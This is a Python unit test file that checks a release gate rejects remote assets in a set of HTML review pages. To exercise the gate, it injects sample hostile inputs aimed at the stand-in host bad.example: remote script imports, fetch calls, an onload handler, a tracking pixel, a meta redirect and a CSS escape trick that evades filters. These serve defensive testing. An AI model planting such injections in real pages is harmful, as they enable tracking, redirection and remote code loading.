"""Adversarial R91 tests on real R90-generated review components."""
import importlib.util
import json
import os
import shutil
import tempfile
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
spec = importlib.util.spec_from_file_location('apollo_r91_gate', HERE.parent/'tools'/'build_release_candidate_r91.py')
gate = importlib.util.module_from_spec(spec)
spec.loader.exec_module(gate)

class AssetBoundaryTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.temp = tempfile.TemporaryDirectory()
        cls.base = Path(cls.temp.name)/'base'
        fixture=os.environ.get('APOLLO_R91_FIXTURE_DIR')
        if fixture:
            shutil.copytree(Path(fixture),cls.base)
        else:
            gate.builder().build(cls.base)

    @classmethod
    def tearDownClass(cls):
        cls.temp.cleanup()

    def mutate(self, name, new_text, gate_code):
        with tempfile.TemporaryDirectory() as t:
            clone = Path(t)/'copy'
            shutil.copytree(self.base,clone)
            file = clone/name
            before=file.read_text('utf8')
            after=new_text(before)
            self.assertNotEqual(before,after)
            file.write_text(after,'utf8')
            with self.assertRaisesRegex(ValueError,gate_code):
                gate.audit_asset_boundary(clone)

    def test_all_four_actual_pages_and_five_local_assets(self):
        self.assertEqual(gate.audit_asset_boundary(self.base)['assets_allowlisted'],5)

    def test_remote_stylesheet_rejected(self):
        self.mutate('R89_REVIEW_HUB.html',lambda s:s.replace(
            'href="review_hub_r89.css"','href="https://bad.example/h.css"',1),
            'R91_HTML_ASSET_BOUNDARY')

    def test_extra_preload_and_tracking_pixel_rejected(self):
        self.mutate('R85_NASA_SOURCE_REVIEW.html',lambda s:s.replace(
            '</head>','<link rel="preload" href="https://bad.example/a.png"></head>',1),
            'R91_HTML_ASSET_BOUNDARY')

    def test_css_background_photo_rejected(self):
        self.mutate('chronology_r87.css',lambda s:s+'\n.cover{background-image:url(https://bad.example/nasa.jpg)}',
                    'R91_CSS_MEDIA_OR_REMOTE_IMPORT')

    def test_css_font_import_rejected(self):
        self.mutate('reading_room_r88.css',lambda s:'@import "https://bad.example/fonts";\n'+s,
                    'R91_CSS_MEDIA_OR_REMOTE_IMPORT')

    def test_css_escape_bypass_rejected(self):
        self.mutate('rights_board_r85.css',lambda s:s+'\n.x{background:ur\\6c(https://bad.example/a)}',
                    'R91_CSS_MEDIA_OR_REMOTE_IMPORT')

    def test_js_network_fetch_rejected(self):
        self.mutate('reading_room_r88.js',lambda s:s+'\nfetch("https://bad.example/");',
                    'R91_UNREVIEWED_SCRIPT_NETWORK')

    def test_js_dynamic_import_rejected(self):
        self.mutate('reading_room_r88.js',lambda s:s+'\nimport("https://bad.example/a.js");',
                    'R91_UNREVIEWED_SCRIPT_NETWORK')

    def test_inline_event_handler_rejected(self):
        self.mutate('R87_PHOTOGRAPH_DATE_RAIL.html',lambda s:s.replace(
            '<body','<body onload="fetch(\'https://bad.example\')"',1),
            'R91_HTML_ASSET_BOUNDARY')

    def test_meta_redirect_rejected(self):
        self.mutate('R89_REVIEW_HUB.html',lambda s:s.replace(
            '</head>','<meta http-equiv="refresh" content="0;url=https://bad.example"></head>',1),
            'R91_HTML_ASSET_BOUNDARY')

    def test_embedded_style_rejected(self):
        self.mutate('R88_READING_ROOM.html',lambda s:s.replace(
            '</head>','<style>body{color:red}</style></head>',1),
            'R91_HTML_ASSET_BOUNDARY')

    def test_unreviewed_file_rejected(self):
        with tempfile.TemporaryDirectory() as t:
            clone=Path(t)/'copy'
            shutil.copytree(self.base,clone)
            (clone/'unreviewed.jpg').write_bytes(b'not actually a photo')
            with self.assertRaisesRegex(ValueError,'R91_UNEXPECTED_OR_MISSING_ASSET'):
                gate.audit_asset_boundary(clone)

    def test_inherited_rights_hold_cannot_be_cleared(self):
        with tempfile.TemporaryDirectory() as t:
            clone=Path(t)/'copy'
            shutil.copytree(self.base,clone)
            f=clone/'R89_INTEGRITY_RECEIPT.json'
            data=json.loads(f.read_text())
            data['publication_approved']=True
            f.write_text(json.dumps(data))
            with self.assertRaisesRegex(ValueError,'R91_INHERITED_SOURCE_GATE_MISSING'):
                gate.audit_asset_boundary(clone)

if __name__=='__main__':
    unittest.main()
